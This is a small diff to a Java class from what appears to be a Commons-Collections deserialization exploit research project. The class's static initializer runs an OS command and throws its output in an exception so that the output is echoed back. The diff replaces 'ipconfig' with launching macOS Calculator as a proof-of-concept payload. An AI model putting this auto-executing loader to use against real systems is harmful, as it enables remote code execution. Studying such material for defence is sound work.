@@ -3,7 +3,7 @@ package com.threedr3am.bug.collections3.no2;
 import java.io.BufferedInputStream;
 
 /**
- * 利用加载时自动执行
+ * 利用加载时自动执行 & 抛异常回显
  *
  * Created by xuanyonghao on 2018/5/5.
  */
@@ -25,7 +25,7 @@ public class CallbackRuntime2 {
     }
     static {
         if (true) {
-            throw new RuntimeException(exec("ipconfig"));
+            throw new RuntimeException(exec("/Applications/Calculator.app/Contents/MacOS/Calculator"));
         }
     }
 }
